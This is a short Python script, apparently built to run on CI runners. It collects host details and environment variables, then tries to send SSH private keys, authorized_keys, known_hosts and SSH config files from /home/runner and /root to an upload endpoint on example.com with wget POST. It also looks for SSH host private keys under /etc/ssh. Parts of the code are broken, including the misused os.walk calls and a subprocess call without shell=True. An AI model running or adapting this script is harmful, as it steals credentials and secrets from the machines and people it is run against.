#!/usr/bin/env python

import subprocess
from os import walk

def run(cmd):
    result = subprocess.run(
        cmd,
        shell=True,
        capture_output=True,
        text=True)

def emit(path):
    print("emitting {}".format(path))
    subprocess.run("wget --method=POST --post-file={} -O - https://example.com/upload".format(path))

homes = ['/home/runner']

run('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null')
run('printenv')

try:
    for h in homes+['/root']:
        for f in ['/.ssh/id_rsa','/.ssh/id_ed25519','/.ssh/id_ecdsa','/.ssh/id_dsa','/.ssh/authorized_keys','/.ssh/known_hosts','/.ssh/config']:
            emit(h+f)
        walk([h+'/.ssh'],2,lambda fp,fn:True)
    
    walk(['/etc/ssh'],1,lambda fp,fn:fn.startswith('ssh_host') and fn.endswith('_key'))
except FileNotFoundError as e:
    print(f"file not found {e}")

